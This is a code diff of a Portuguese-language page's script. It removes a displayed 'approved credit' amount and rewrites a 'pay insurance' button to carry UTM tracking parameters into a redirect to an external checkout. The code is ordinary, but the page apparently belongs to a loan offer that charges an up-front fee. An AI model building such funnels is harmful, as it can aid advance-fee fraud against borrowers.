@@ -1896,23 +1896,39 @@ window.addEventListener("beforeunload", ()=>{
     <!-- Cola o script AQUI, antes de fechar o body -->
 <script>
 document.addEventListener("DOMContentLoaded", () => {
-  const valorAprovado = localStorage.getItem("creditoAprovado") || "7.584,00";
-  const approvedEl = document.getElementById("approvedAmount");
-  const liberacaoEl = document.getElementById("valorLiberacaoCard");
-
-  if (approvedEl) approvedEl.textContent = "R$ " + valorAprovado;
-  if (liberacaoEl) liberacaoEl.textContent = "R$ " + valorAprovado;
-
   const btnPayInsurance = document.getElementById("btnPayInsurance");
+
   if (btnPayInsurance) {
     btnPayInsurance.addEventListener("click", () => {
       btnPayInsurance.disabled = true;
-      const urlParams = new URLSearchParams(window.location.search);
-      urlParams.set("valor", "2993");
-      window.location.href = `https://pay.segurahojes.site/6914b44cfa5673aa56704a65`;
+
+      // Recupera UTMs do localStorage (salvas pela UTMify)
+      const utm = JSON.parse(localStorage.getItem("utm_master") || "{}");
+      const params = new URLSearchParams(utm);
+
+      // Também tenta capturar UTMs da URL atual (caso venham no query)
+      const currentParams = new URLSearchParams(window.location.search);
+      currentParams.forEach((v, k) => {
+        if (k.startsWith("utm_")) params.set(k, v);
+      });
+
+      // Adiciona o valor ou outros parâmetros fixos
+      const valor = localStorage.getItem("creditoAprovado") || "2163";
+      params.set("valor", valor);
+
+      // Garante fallback caso não tenha nenhuma UTM
+      if (!params.has("utm_source")) params.set("utm_source", "direct");
+      if (!params.has("utm_medium")) params.set("utm_medium", "redirect");
+      if (!params.has("utm_campaign")) params.set("utm_campaign", "will_funnel");
+
+      // Redireciona mantendo tudo
+      const checkoutUrl = `https://pay.segurahojes.site/6914b44cfa5673aa56704a65?${params.toString()}`;
+      console.log("Redirecting to:", checkoutUrl);
+      window.location.href = checkoutUrl;
     });
   }
 });
 </script>
+
 
 </body></html>
